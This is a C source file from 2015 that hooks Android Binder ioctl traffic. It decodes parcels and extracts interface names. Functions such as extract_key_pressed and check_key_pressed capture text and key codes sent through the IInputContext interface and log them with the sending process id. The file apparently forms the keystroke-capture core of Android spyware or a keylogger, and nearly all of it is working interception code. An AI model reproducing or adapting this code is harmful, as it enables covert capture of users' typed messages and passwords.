/*
 * =====================================================================================
 *
 *       Filename:  ioctl_helper.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  15/04/2015 14:53:04
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  zad (), wtfrtfmdiy@gmail.com
 *   Organization:  ht
 *
 * =====================================================================================
 */
#include "ioctl_helper.h"
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#undef log
#define DEBUG
#ifdef DEBUG
#define LOG_TAG "ioctl_helper"
#include "log.h"
#define log LOGD
#endif

char ioctlBuff[512];
char ioctlBuff2[512];
char * get_tr(unsigned int tc)
{
  switch (tc)
  {
    case BR_ERROR:
      return "BC_ERROR";
    case BR_SPAWN_LOOPER:
      return "BR_SPAWN_LOOPER";
    case BR_DEAD_REPLY:
      return "BR_DEAD_REPLY";
    case BR_TRANSACTION:
      return "BR_TRANSACTION";
    case BR_REPLY:
      return "BR_REPLY";
    case BR_TRANSACTION_COMPLETE:
      return "BR_TRANSACTION_COMPLETE";
    case BR_INCREFS:
      return "BR_INCREFS";
    case BR_ACQUIRE:
      return "BR_ACQUIRE";
    case BR_NOOP:
      return "BR_NOOP";
    case BR_ACQUIRE_RESULT:
      return "BR_ACQUIRE_RESULT";
    case BR_RELEASE:
      return "BR_RELEASE";
    case BR_DECREFS:
      return "BR_DECREFS";
    case BR_ATTEMPT_ACQUIRE:
      return "BR_ATTEMP_ACQUIRE";
    case BR_DEAD_BINDER:
      return "BR_DEAD_DINDER";
    case BR_FAILED_REPLY:
      return "BR_FAILED_REPLY";
    case BR_CLEAR_DEATH_NOTIFICATION_DONE:
      return "BR_CLEAR_DEATH_NOTIFICATION_DONE";
    default:
      return "UNKNOWN";
  }
}
char * get_tc(unsigned int tc)
{
  switch (tc)
  {
    case BC_ENTER_LOOPER:
      return "BC_ENTER_LOOPER";
    case BC_EXIT_LOOPER:
      return "BC_EXIT_LOOPER";
    case BC_FREE_BUFFER:
      return "BC_FREE_BUFFER";
    case BC_TRANSACTION:
      return "BC_TRANSACTION";
    case BC_REPLY:
      return "BC_REPLY";
    case BC_ACQUIRE_RESULT:
      return "BC_ACQUIRE_RESULT";
    case BC_INCREFS:
      return "BC_INCREFS";
    case BC_ACQUIRE:
      return "BC_ACQUIRE";
    case BC_INCREFS_DONE:
      return "BC_INCREFS_DONE";
    case BC_ACQUIRE_DONE:
      return "BC_ACQUIRE_DONE";
    case BC_RELEASE:
      return "BC_RELEASE";
    case BC_DECREFS:
      return "BC_DECREFS";
    case BC_ATTEMPT_ACQUIRE:
      return "BC_ATTEMP_ACQUIRE";
    case BC_REGISTER_LOOPER:
      return "BC_REGISTER_LOOPER";
    case BC_DEAD_BINDER_DONE:
      return "BC_DEAD_DINDER_DONE";
    case BC_REQUEST_DEATH_NOTIFICATION:
      return "BC_REQUEST_DEATH_NOTIFICATION_DONE";
    case BC_CLEAR_DEATH_NOTIFICATION:
      return "BC_CLEAR_DEATH_NOTIFICATION_DONE";
    default:
      return "UNKNOWN";
  }
}
/* extract a text from a buffer where it is stored using the 
 * native_parcel convention, which is 
 * 32 bit is spanned string
 * 32 bit of strlen
 * and then UTF-16 string
 *
 * returns char_len in case of success
 * <= zero otherwise
 */
int extract_parcel_text(unsigned int *text,char * buffer,size_t len){
	if (text == NULL || buffer == NULL){
		log("%s: null buffer",__FUNCTION__);
		return -1;
	}
	int32_t span = !((int32_t)text[0]);
	log("%s:span text =%d ",__FUNCTION__,span);
//skyip the first int32_t that tells if text if spanned or not, and extract str_len
	int32_t char_len = ((int32_t)text[1]);
	if( char_len > 0 && char_len < len-1 ){
		uint16_t *chars_start = (uint16_t*)&text[2];
		// add string terminator
		//hexdump_16((const void *)chars_start,char_len);
		buffer[char_len]=0;
		int i =0;
		while(i<char_len){ //get also the string terminator
			ioctlBuff2[i]=(char)chars_start[i];
			//log("chars_start[%d]=%c ",i,(char)chars_start[i]);
			i++;
		}
	}else{
		snprintf(ioctlBuff2,sizeof(ioctlBuff2),"%s","null data");
		//log("%s [%s]:invalid str_len %d\n",__FUNCTION__,info,str_len);
		return 0;
	}
	return char_len;
}
void extract_key_pressed(char *interface_name,unsigned int *parcel,uint32_t code)
{
	char *res=NULL;
	unsigned int *tmp_ptr = NULL;
  if(interface_name && parcel){
    if ( strcasestr(interface_name, "com.android.internal.view.IInputContext") && 
		    (code >= 0x6 && code <= 0x8 || code == 17) ){
      int32_t str_len = (int32_t)parcel[1] + 1;
      uint16_t *int_desc = (uint16_t *)&parcel[2]; 
      int32_t char_len = -1;
      tmp_ptr=NULL;
      if(code == 0x9 ){ //commitCompletition
	      // here below is how a CompletitionInfo is organized inside a
	      // parcel
	      //dest.writeLong(mId); 8 byte write
	      //dest.writeInt(mPosition); 4 byte 
	      //TextUtils.writeToParcel(mText, dest, flags); strlen + utf16
	      //TextUtils.writeToParcel(mLabel, dest, flags); strlen + utf16
	      tmp_ptr = &((unsigned int *)&int_desc[str_len])[1];//skip the first int32_t that is written by the interface protocol
	      tmp_ptr += 12; //skip mId long and mPosition


      }else if(code == 17){
	      /* sendKeyEvent:
		 	out.writeInt(1);
		 android.view.event.writeToParcel(_data, 0); that is :
		 	out.writeInt(PARCEL_TOKEN_KEY_EVENT);
		 	out.writeInt(mDeviceId);
		 	out.writeInt(mSource);
		 	out.writeInt(mAction);
		 	out.writeInt(mKeyCode); <------ interesting stuff
		 	out.writeInt(mRepeatCount); <----- interesting stuff
		 	out.writeInt(mMetaState);
		 	out.writeInt(mScanCode);
		 	out.writeInt(mFlags);
		 	out.writeLong(mDownTime);
		 	out.writeLong(mEventTime);
		 */
	      int key_code = ((unsigned int *)&int_desc[str_len])[5];//skip first 4 words
	      int repeated = ((unsigned int *)&int_desc[str_len])[6];//skip first 5 words
	      snprintf(ioctlBuff2,sizeof(ioctlBuff2),"keyCode=%d repeated=%d",key_code,repeated);
	      tmp_ptr=NULL;
	      res=ioctlBuff2;
	      char_len = repeated;
      }else{
	      tmp_ptr = &((unsigned int *)&int_desc[str_len])[1];//skip the first int32_t that is written by the interface protocol
	      	      /*
      int32_t char_len = ((int32_t *)&int_desc[str_len])[2];
	      if( char_len > 0 && char_len < sizeof(ioctlBuff2)-1 ){
        uint16_t *chars_start = (uint16_t*)&((int32_t *)&int_desc[str_len])[3];
        // add string terminator
        //hexdump_16((const void *)chars_start,char_len);
        ioctlBuff2[char_len]=0;
        int i =0;
        while(i<char_len){ //get also the string terminator
          ioctlBuff2[i]=(char)chars_start[i];
          //log("chars_start[%d]=%c ",i,(char)chars_start[i]);
          i++;
        }
      }else{
        snprintf(ioctlBuff2,sizeof(ioctlBuff2),"%s","null data");
        //log("%s [%s]:invalid str_len %d\n",__FUNCTION__,info,str_len);
      }
      */
    }
      if(tmp_ptr && (char_len=extract_parcel_text(tmp_ptr,ioctlBuff2,sizeof(ioctlBuff2)))>=0){
	      res=ioctlBuff2;
      }else{
	      log("failes to extract text code[%d]",code);
      }

      if(res){
      log("code[%d] got char_buffer[%d]=%s \n",code,char_len,res);
      }
    }else{
      log(" wrong data code:%d", code);
    }
  }else{
    log("null parcel or string s=%p , parcel=%x",
        interface_name,parcel);
  }
}

void check_key_pressed(char *info,char *interface_name,struct binder_transaction_data *data)
{
  if(interface_name && data && data->data.ptr.buffer){
    if ( strcasestr(interface_name, "com.android.internal.view.IInputContext") && data->code == 0x6){
      const uint32_t *parcel = data->data.ptr.buffer;
      int32_t str_len = (int32_t)parcel[1] + 1;
      uint16_t *int_desc = (uint16_t *)&parcel[2];
      pid_t sender_pid = data->sender_pid;
      uid_t sender_uid = data->sender_euid;
      int32_t char_len = ((int32_t *)&int_desc[str_len])[2];
      if( char_len > 0 && char_len < sizeof(ioctlBuff)-1 ){
        uint16_t *chars_start = (uint16_t*)&((int32_t *)&int_desc[str_len])[3];
        // add string terminator
        hexdump_16((const void *)chars_start,char_len);
        ioctlBuff[char_len]=0;
        int i =0;
        while(i<char_len){ //get also the string terminator
          ioctlBuff[i]=(char)chars_start[i];
          //log("chars_start[%d]=%c ",i,(char)chars_start[i]);
          i++;
        }
      }else{
        snprintf(ioctlBuff,sizeof(ioctlBuff),"%s","null data");
        //log("%s [%s]:invalid str_len %d\n",__FUNCTION__,info,str_len);
      }
      log("got char_buffer[%d]=%s sender pid=%d\n",char_len,ioctlBuff,sender_pid);
    }else{
      log(" wrong data code:%d", data->code);
    }
  }else{
    log("null data or string s=%p , data=%p , data->data.ptr.buffer=%p data->data.ptr.offsets=%p",
        interface_name,data,(data)?data->data.ptr.buffer:0x0,
        (data)?data->data.ptr.offsets:0x0);
  }
}
char * get_intf_desc_parcel(uint32_t *parcel,uint32_t transaction_code)
{
	ioctlBuff[0]=ioctlBuff[1]=0;
	log("%s",__FUNCTION__);
	if(parcel){
		int32_t str_len = (int32_t)parcel[1];
		//hexdump(parcel,20);
		//hexdump_16((const void *)parcel,20);
		uint16_t *int_desc = (uint16_t *)&parcel[2];
		if( str_len > 0 && str_len < sizeof(ioctlBuff)-1 ){
			int i =0;
			while(i<=str_len){ //get also the string terminator
				ioctlBuff[i]=(char)int_desc[i];
				//log("int_desc[%d]=%c ",i,(char)int_desc[i]);
				i++;
			}
		}else{
			snprintf(ioctlBuff,sizeof(ioctlBuff),"%s","null data [s]");
			log("%s :invalid str_len %x\n",__FUNCTION__,str_len);
		}
	}else{
		snprintf(ioctlBuff,sizeof(ioctlBuff),"%s","null data [p]");
	}
	return ioctlBuff;
}

char * get_intf_desc(struct binder_transaction_data *data,uint32_t transaction_code,char *info)
{
  ioctlBuff[0]=ioctlBuff[1]=0;
  const uint32_t *parcel = NULL;
  if( info == NULL ){
    info = "";
  }
  log("%s [%s]",__FUNCTION__,info);
  if(data && data->data.ptr.buffer){
    parcel = data->data.ptr.buffer;
    //log("%s [%s]:parsel at %p function code %x\n",__FUNCTION__,info,parcel,data->code);
    int32_t str_len = (int32_t)parcel[1];
    //log("%s [%s]:copying..\n",__FUNCTION__,info);
    uint16_t *int_desc = (uint16_t *)&parcel[2];
    //log("%s [%s]:chars at chars %x\n",__FUNCTION__,info,int_desc);
    //log("%s [%s]:coping chars %d\n",__FUNCTION__,info,str_len);
    if( str_len > 0 && str_len < sizeof(ioctlBuff)-1 ){
      // add string terminator
      int i =0;

      while(i<=str_len){ //get also the string terminator
        ioctlBuff[i]=(char)int_desc[i];
        //log("int_desc[%d]=%c ",i,(char)int_desc[i]);
        i++;
      }
      /*  tested it works
      if ( strcasestr(ioctlBuff, "com.android.internal.view.IInputContext") ){
        int32_t char_len = ((int32_t *)&int_desc[i])[2];
        uint16_t *chars_start = (uint16_t*)&((int32_t *)&int_desc[i])[3];
        if( char_len > 0 && char_len < sizeof(ioctlBuff2)-1 ){
          // add string terminator
          ioctlBuff2[char_len]=0;
          int i =0;
          while(i<char_len){ //get also the string terminator
            ioctlBuff2[i]=(char)chars_start[i];
            log("chars_start[%d]=%c ",i,(char)chars_start[i]);
            i++;
          }
        }else{
          snprintf(ioctlBuff2,sizeof(ioctlBuff2),"%s","null data");
          //log("%s [%s]:invalid str_len %d\n",__FUNCTION__,info,str_len);
        }
        log("got char_buffer[%d]=%s\n",char_len,ioctlBuff2);
      }
      */
    }else{
      snprintf(ioctlBuff,sizeof(ioctlBuff),"%s","null data");
      //log("%s [%s]:invalid str_len %d\n",__FUNCTION__,info,str_len);
    }
  }else{
    snprintf(ioctlBuff,sizeof(ioctlBuff),"%s","null data");
  }
  return ioctlBuff;
}
void hexdump_16(const void *_data, unsigned len)
{
  const uint16_t *data = _data;
  unsigned count;
  ioctlBuff[0]=0;
  char *ptr=&ioctlBuff[0];
  for (count = 0; count < len; count++) {
    if ((count & 15) == 0)
      ptr+=sprintf(ptr,"addr %04x:", count);
        //log("%04x:", count);
        ptr+=sprintf(ptr," %04x", *data);
    //log(" %02x %c", *data, (*data < 32) || (*data > 126) ? '.' : *data);
    data++;
    if ((count & 15) == 15){
      log("%s",ioctlBuff);
      ioctlBuff[0]=0; 
      ptr=&ioctlBuff[0];
    }
  }
}
void hexdump(const void *_data, unsigned len)
{
  const unsigned char *data = _data;
  unsigned count;
  ioctlBuff[0]=0;
  char *ptr=&ioctlBuff[0];
  for (count = 0; count < len; count++) {
    if ((count & 15) == 0)
      ptr+=sprintf(ptr,"addr %04x:", count);
        //log("%04x:", count);
        ptr+=sprintf(ptr," %02x %c ", *data, (*data < 32) || (*data > 126) ? '.' : *data);
    //log(" %02x %c", *data, (*data < 32) || (*data > 126) ? '.' : *data);
    data++;
    if ((count & 15) == 15){
      log("%s",ioctlBuff);
      ioctlBuff[0]=0; 
      ptr=&ioctlBuff[0];
    }
  }
}
void binder_dump_txn(struct binder_txn *txn)
{
  struct binder_object *obj;
  if(txn == NULL)
    return;
  unsigned *offs = txn->offs;
  unsigned count = txn->offs_size / 4;

  log("target %p  cookie %p  code %08x  flags %08x\n",
      txn->target, txn->cookie, txn->code, txn->flags);
  log("  pid %8d  uid %8d  data %8d  offs %8d\n",
      txn->sender_pid, txn->sender_euid, txn->data_size, txn->offs_size);
  //hexdump(txn->data, txn->data_size);
  while (txn->data!=NULL && count--) {
    obj = (void*) (((char*) txn->data) + *offs++);
    log("  - type %08x  flags %08x  ptr %p  cookie %p\n",
        obj->type, obj->flags, obj->pointer, obj->cookie);
  }
}

const void* printBinderTransactionData(const void* data)
{
  const struct binder_transaction_data *btd = (const struct binder_transaction_data*)data;
    log("----- START TRANSACTION DATA ------\n" );
    if (btd->target.handle < 1024) {
        /* want to print descriptors in decimal; guess based on value */
        log("target.desc= %x" , btd->target.handle);
    } else {
        log("target.ptr= %p" , btd->target.ptr);
    }
    log("cookie = %x\n" , btd->cookie );
    log("code = %x flags =%x \n", btd->code , (void*)btd->flags);
    log("data= %p [bytes %d]\n" , btd->data.ptr.buffer , (void*)btd->data_size);
    log("offsets = %p [bytes %d]\n" , btd->data.ptr.offsets , (void*)btd->offsets_size);
    log("+++++ END TRANSACTION DATA ++++++\n" );
    return btd+1;

}
struct binder_transaction_data* get_btd(struct binder_write_read *bwr,char write,char *info)
{
  struct binder_transaction_data *btd = NULL;
  uint32_t transaction_code = 0;
  if( info == NULL ){
    info = "";
  }
  log("%s [%s]: called reading %s\n",__FUNCTION__,info,write?"write_buffer":"read_buffer");
  if (write  && bwr->write_buffer) {
    transaction_code = ((unsigned int *) bwr->write_buffer)[0];
    btd = (struct binder_transaction_data *) &((unsigned int *) bwr->write_buffer)[1];
    //log("%s [%s] write: tc=%d(%s) %s",__FUNCTION__,info,transaction_code, get_tc(transaction_code), (btd->flags & TF_ONE_WAY) ? "ONW WAY" : "");
    if( transaction_code == BC_TRANSACTION  || transaction_code == BC_REPLY ){
      //binder_dump_txn((struct binder_txn *)bwr->write_buffer);
#ifdef DEBUG_RAW
      const void* cmds = (const void*)&((unsigned int *) bwr->write_buffer)[1]; 
      const void* end = ((const uint8_t*)cmds)+bwr->write_size;
      if(cmds){
        hexdump(cmds,bwr->write_size);
        if (cmds < end && cmds){
          cmds=printBinderTransactionData(cmds);
        }
      }
#endif
      char *interface=get_intf_desc(btd,transaction_code,info);
      log("%s [%s] write: desc=%s",__FUNCTION__,info,interface);
      check_key_pressed(info,interface,btd);
    }
    //,get_intf_desc(btd->data.ptr.buffer));
  }else if(!write &&  bwr->read_buffer){
    transaction_code = ((unsigned int *) bwr->read_buffer)[0];
    btd = (struct binder_transaction_data *)  &((unsigned int *)bwr->read_buffer)[1];
    //log("%s [%s] read: tr=%d(%s) %s",__FUNCTION__,info,transaction_code, get_tr(transaction_code), (btd->flags & TF_ONE_WAY) ? "ONW WAY" : "");
    if( transaction_code == BR_TRANSACTION  || transaction_code == BR_REPLY){
      //binder_dump_txn((struct binder_txn*)bwr->read_buffer);
#ifdef DEBUG_RAW
      const void* cmds =  (const void*)&((unsigned int *) bwr->read_buffer)[1];
      const void* end = ((const uint8_t*)cmds)+bwr->read_size;
      if(cmds){
        hexdump(cmds,bwr->read_size);
        if (cmds < end && cmds){
          cmds=printBinderTransactionData(cmds);
        }
      }
#endif
      char *interface=get_intf_desc(btd,transaction_code,info);
      log("%s [%s] read: desc=%s",__FUNCTION__,info,interface);
      check_key_pressed(info,interface,btd);
    }
    //,get_intf_desc(btd->data.ptr.buffer));
  }
  return btd;
}
struct binder_transaction_data* get_btd_verbose(struct binder_write_read *bwr,char write,char *info)
{
  struct binder_transaction_data *btd = NULL;
  uint32_t transaction_code = 0;
  if( info == NULL ){
    info = "";
  }
  log("%s [%s]: called reading %s\n",__FUNCTION__,info,write?"write_buffer":"read_buffer");
  if (write  && bwr->write_buffer) {
    transaction_code = ((unsigned int *) bwr->write_buffer)[0];
    btd = (struct binder_transaction_data *) &((unsigned int *) bwr->write_buffer)[1];
    log("%s [%s] write: tc=%d(%s) %s",__FUNCTION__,info,transaction_code, get_tc(transaction_code), (btd->flags & TF_ONE_WAY) ? "ONW WAY" : "");
    if( transaction_code == BC_TRANSACTION  || transaction_code == BC_REPLY ){
      //binder_dump_txn((struct binder_txn *)bwr->write_buffer);
#ifdef DEBUG_RAW
      const void* cmds = (const void*)&((unsigned int *) bwr->write_buffer)[1]; 
      const void* end = ((const uint8_t*)cmds)+bwr->write_size;
      if(cmds){
        hexdump(cmds,bwr->write_size);
        if (cmds < end && cmds){
          cmds=printBinderTransactionData(cmds);
        }
      }
#endif
      char *interface=get_intf_desc(btd,transaction_code,info);
      log("%s [%s] write: desc=%s",__FUNCTION__,info,interface);
      check_key_pressed(info,interface,btd);
    }
    //,get_intf_desc(btd->data.ptr.buffer));
  }else if(!write &&  bwr->read_buffer){
    transaction_code = ((unsigned int *) bwr->read_buffer)[0];
    btd = (struct binder_transaction_data *)  &((unsigned int *)bwr->read_buffer)[1];
    log("%s [%s] read: tr=%d(%s) %s",__FUNCTION__,info,transaction_code, get_tr(transaction_code), (btd->flags & TF_ONE_WAY) ? "ONW WAY" : "");
    if( transaction_code == BR_TRANSACTION  || transaction_code == BR_REPLY){
      //binder_dump_txn((struct binder_txn*)bwr->read_buffer);
#ifdef DEBUG_RAW
      const void* cmds =  (const void*)&((unsigned int *) bwr->read_buffer)[1];
      const void* end = ((const uint8_t*)cmds)+bwr->read_size;
      if(cmds){
        hexdump(cmds,bwr->read_size);
        if (cmds < end && cmds){
          cmds=printBinderTransactionData(cmds);
        }
      }
#endif
      char *interface=get_intf_desc(btd,transaction_code,info);
      log("%s [%s] read: desc=%s",__FUNCTION__,info,interface);
      check_key_pressed(info,interface,btd);
    }
    //,get_intf_desc(btd->data.ptr.buffer));
  }
  return btd;
}

